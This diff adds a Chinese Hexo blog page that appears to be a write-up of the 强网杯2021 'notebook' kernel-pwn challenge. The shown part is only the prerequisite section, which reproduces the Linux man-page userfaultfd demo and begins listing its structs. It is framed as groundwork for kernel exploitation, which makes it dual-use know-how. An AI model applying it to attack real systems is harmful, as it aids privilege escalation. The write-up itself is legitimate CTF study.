@@ -1,0 +1,848 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="flyyy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="kernel的简单学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2021 notebook">
+<meta property="og:url" content="http://example.com/2024/08/20/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="kernel的简单学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/title.jpg">
+<meta property="article:published_time" content="2024-08-20T04:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-20T06:14:49.691Z">
+<meta property="article:author" content="flyyy">
+<meta property="article:tag" content="kernel pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/title.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>强网杯2021 notebook - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":"zh-CN","copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>flyyy&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/banner.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="强网杯2021 notebook"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        flyyy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-20 12:00" pubdate>
+          2024年8月20日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">强网杯2021 notebook</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="强网杯2021-notebook"><a href="#强网杯2021-notebook" class="headerlink" title="强网杯2021 notebook"></a>强网杯2021 notebook</h1><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="userfaultfd的使用"><a href="#userfaultfd的使用" class="headerlink" title="userfaultfd的使用"></a>userfaultfd的使用</h2><p>借助<code>linux man page</code> ，分析下官方的demo</p>
+<p>以下为完整版</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">/* userfaultfd_demo.c</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Licensed under the GNU General Public License version 2 or later.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>   <span class="hljs-type">int</span>                 nready;<br>   <span class="hljs-type">long</span>                uffd;   <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>   <span class="hljs-type">ssize_t</span>             nread;<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span>       <span class="hljs-title">pollfd</span>;</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span>  <span class="hljs-title">uffdio_copy</span>;</span><br><br>   <span class="hljs-type">static</span> <span class="hljs-type">int</span>      fault_cnt = <span class="hljs-number">0</span>; <span class="hljs-comment">/* Number of faults so far handled */</span><br>   <span class="hljs-type">static</span> <span class="hljs-type">char</span>     *page = <span class="hljs-literal">NULL</span>;<br>   <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span>  <span class="hljs-title">msg</span>;</span>  <span class="hljs-comment">/* Data read from userfaultfd */</span><br><br>   uffd = (<span class="hljs-type">long</span>) arg;<br><br>   <span class="hljs-comment">/* Create a page that will be copied into the faulting region. */</span><br><br>   <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) &#123;<br>       page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                   MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>       <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>           err(EXIT_FAILURE, <span class="hljs-string">&quot;mmap&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">      file descriptor. */</span><br><br>   <span class="hljs-keyword">for</span> (;;) &#123;<br><br>       <span class="hljs-comment">/* See what poll() tells us about the userfaultfd. */</span><br><br>       pollfd.fd = uffd;<br>       pollfd.events = POLLIN;<br>       nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>       <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>           err(EXIT_FAILURE, <span class="hljs-string">&quot;poll&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>              <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>              (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>              (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>       <span class="hljs-comment">/* Read an event from the userfaultfd. */</span><br><br>       nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>           err(EXIT_FAILURE, <span class="hljs-string">&quot;read&quot;</span>);<br><br>       <span class="hljs-comment">/* We expect only one kind of event; verify that assumption. */</span><br><br>       <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;<br>           <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-comment">/* Display info about the page-fault event. */</span><br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %&quot;</span>PRIx64<span class="hljs-string">&quot;; &quot;</span>, msg.arg.pagefault.flags);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %&quot;</span>PRIx64<span class="hljs-string">&quot;\n&quot;</span>, msg.arg.pagefault.address);<br><br>       <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">          region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">          is more obvious that each fault is handled separately. */</span><br><br>       <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>       fault_cnt++;<br><br>       uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br><br>       <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">          So, round faulting address down to page boundary. */</span><br><br>       uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                          ~(page_size - <span class="hljs-number">1</span>);<br>       uffdio_copy.len = page_size;<br>       uffdio_copy.mode = <span class="hljs-number">0</span>;<br>       uffdio_copy.copy = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>           err(EXIT_FAILURE, <span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %&quot;</span>PRId64<span class="hljs-string">&quot;)\n&quot;</span>,<br>              uffdio_copy.copy);<br>   &#125;<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>   <span class="hljs-type">int</span>        s;<br>   <span class="hljs-type">char</span>       c;<br>   <span class="hljs-type">char</span>       *addr;   <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br>   <span class="hljs-type">long</span>       uffd;    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>   <span class="hljs-type">size_t</span>     len, l;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br>   <span class="hljs-type">pthread_t</span>  thr;     <span class="hljs-comment">/* ID of thread that handles page faults */</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span>       <span class="hljs-title">uffdio_api</span>;</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span>  <span class="hljs-title">uffdio_register</span>;</span><br><br>   <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>       <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Usage: %s num-pages\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>       <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>   &#125;<br><br>   page_size = sysconf(_SC_PAGE_SIZE);<br>   len = strtoull(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>) * page_size;<br><br>   <span class="hljs-comment">/* Create and enable userfaultfd object. */</span><br><br>   uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>   <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>       err(EXIT_FAILURE, <span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>   <span class="hljs-comment">/* <span class="hljs-doctag">NOTE:</span> Two-step feature handshake is not needed here, since this</span><br><span class="hljs-comment">      example doesn&#x27;t require any specific features.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Programs that *do* should call UFFDIO_API twice: once with</span><br><span class="hljs-comment">      `features = 0` to detect features supported by this kernel, and</span><br><span class="hljs-comment">      again with the subset of features the program actually wants to</span><br><span class="hljs-comment">      enable. */</span><br>   uffdio_api.api = UFFD_API;<br>   uffdio_api.features = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>       err(EXIT_FAILURE, <span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>   <span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">      demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">      actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">      the userfaultfd. */</span><br><br>   addr = mmap(<span class="hljs-literal">NULL</span>, len, PROT_READ | PROT_WRITE,<br>               MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>   <span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>       err(EXIT_FAILURE, <span class="hljs-string">&quot;mmap&quot;</span>);<br><br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address returned by mmap() = %p\n&quot;</span>, addr);<br><br>   <span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">      handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">      missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>   uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>   uffdio_register.range.len = len;<br>   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>   <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>       err(EXIT_FAILURE, <span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>   <span class="hljs-comment">/* Create a thread that will process the userfaultfd events. */</span><br><br>   s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-type">void</span> *) uffd);<br>   <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) &#123;<br>       errc(EXIT_FAILURE, s, <span class="hljs-string">&quot;pthread_create&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">/* Main thread now touches memory in the mapping, touching</span><br><span class="hljs-comment">      locations 1024 bytes apart. This will trigger userfaultfd</span><br><span class="hljs-comment">      events for all pages in the region. */</span><br><br>   l = <span class="hljs-number">0xf</span>;    <span class="hljs-comment">/* Ensure that faulting address is not on a page</span><br><span class="hljs-comment">                  boundary, in order to test that we correctly</span><br><span class="hljs-comment">                  handle that case in fault_handling_thread(). */</span><br>   <span class="hljs-keyword">while</span> (l &lt; len) &#123;<br>       c = addr[l];<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Read address %p in %s(): &quot;</span>, addr + l, __func__);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c\n&quot;</span>, c);<br>       l += <span class="hljs-number">1024</span>;<br>       usleep(<span class="hljs-number">100000</span>);         <span class="hljs-comment">/* Slow things down a little */</span><br>   &#125;<br><br>   <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="关于注册uffd系统调用的部分"><a href="#关于注册uffd系统调用的部分" class="headerlink" title="关于注册uffd系统调用的部分"></a>关于注册uffd系统调用的部分</h3><p>涉及的变量</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>        s;<br><span class="hljs-type">char</span>       c;<br><span class="hljs-type">char</span>       *addr;   <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br><span class="hljs-type">long</span>       uffd;    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br><span class="hljs-type">size_t</span>     len, l;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br><span class="hljs-type">pthread_t</span>  thr;     <span class="hljs-comment">/* ID of thread that handles page faults */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span>       <span class="hljs-title">uffdio_api</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span>  <span class="hljs-title">uffdio_register</span>;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>涉及的结构体</p>
+<p>uffdio_api</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> &#123;</span><br>	__u64 api;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_FEATURE_PAGEFAULT_FLAG_WP		(1&lt;&lt;0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_FEATURE_EVENT_FORK			(1&lt;&lt;1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_FEATURE_EVENT_REMAP		(1&lt;&lt;2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_FEATURE_EVENT_REMOVE		(1&lt;&lt;3)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_FEATURE_MISSING_HUGETLBFS		(1&lt;&lt;4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_FEATURE_MISSING_SHMEM		(1&lt;&lt;5)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_FEATURE_EVENT_UNMAP		(1&lt;&lt;6)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> 